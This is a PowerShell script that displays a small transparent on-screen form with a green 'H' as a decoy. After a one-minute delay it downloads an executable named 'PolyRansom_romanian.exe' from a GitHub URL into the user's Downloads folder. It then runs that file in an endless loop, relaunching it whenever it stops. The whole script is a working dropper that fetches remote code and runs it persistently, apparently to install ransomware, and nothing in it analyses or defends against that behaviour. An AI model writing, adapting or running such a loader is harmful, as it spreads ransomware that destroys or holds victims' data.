$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
$webClient = New-Object System.Net.WebClient

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'None'
$form.BackColor = [System.Drawing.Color]::Lime
$form.TransparencyKey = $form.BackColor
$form.TopMost = $true
$form.Width = 100
$form.Height = 100

$label = New-Object System.Windows.Forms.Label
$label.Text = "H"
$label.ForeColor = [System.Drawing.Color]::Green
$label.Font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.BackColor = [System.Drawing.Color]::Transparent

$form.Controls.Add($label)
$label.Location = New-Object System.Drawing.Point(($form.Width - $label.Width) / 2, ($form.Height - $label.Height) / 2)

$form.Add_MouseDown({
    $form.Capture = $false
})

$form.Show()

$form.Location = New-Object System.Drawing.Point(
    [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width / 2 - $form.Width / 2,
    [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height / 2 - $form.Height / 2
)

Start-Sleep -Seconds 60

$webClient.DownloadFile($url, $downloadPath)

function IsProcessRunning {
    param([string]$processName)
    return Get-Process -Name $processName -ErrorAction SilentlyContinue
}

while ($true) {
    if (-not (IsProcessRunning "PolyRansom_romanian")) {
        Start-Process -FilePath $downloadPath -Wait
    }
    Start-Sleep -Milliseconds 100
}
